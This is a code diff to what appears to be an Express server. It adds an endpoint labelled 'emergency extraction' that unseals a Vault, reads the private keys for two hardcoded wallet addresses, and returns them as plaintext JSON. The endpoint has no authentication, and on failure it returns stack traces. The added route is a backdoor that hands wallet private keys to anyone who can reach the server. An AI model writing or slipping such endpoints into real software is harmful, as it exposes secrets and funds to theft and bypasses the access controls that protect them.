@@ -653,6 +653,53 @@ app.get('/api/config', (req, res) => {
     });
 });
 
+// EMERGENCY EXTRACTION ENDPOINT - DELETE AFTER RECOVERY
+app.get('/api/emergency/extract-keys', async (req, res) => {
+    try {
+        const results = {
+            vault_status: 'checking',
+            keys_found: [],
+            errors: [],
+            timestamp: new Date().toISOString()
+        };
+
+        // Target addresses
+        const targets = [
+            '0xe14b99363D029AD0E0723958a283dE0e9978D888',
+            '0x7363d49c0ef0ae66ba7907f42932c340136d714f'
+        ];
+
+        // Unseal
+        try {
+            await vault.ensureUnsealed();
+            results.vault_status = 'unsealed';
+        } catch (e) {
+            results.vault_status = `unseal_failed: ${e.message}`;
+        }
+
+        // Extract keys
+        for (const addr of targets) {
+            try {
+                const pk = await vault.getFaucetKey(addr);
+                if (pk) {
+                    results.keys_found.push({
+                        address: addr,
+                        private_key: pk
+                    });
+                } else {
+                    results.errors.push(`${addr}: Not found`);
+                }
+            } catch (e) {
+                results.errors.push(`${addr}: ${e.message}`);
+            }
+        }
+
+        res.json(results);
+    } catch (e) {
+        res.status(500).json({ error: e.message, stack: e.stack });
+    }
+});
+
 app.get('/api/debug/audit-vault', async (req, res) => {
     try {
         const VAULT_ADDR = process.env.VAULT_ADDR || "http://vault-railway-template.railway.internal:8200";
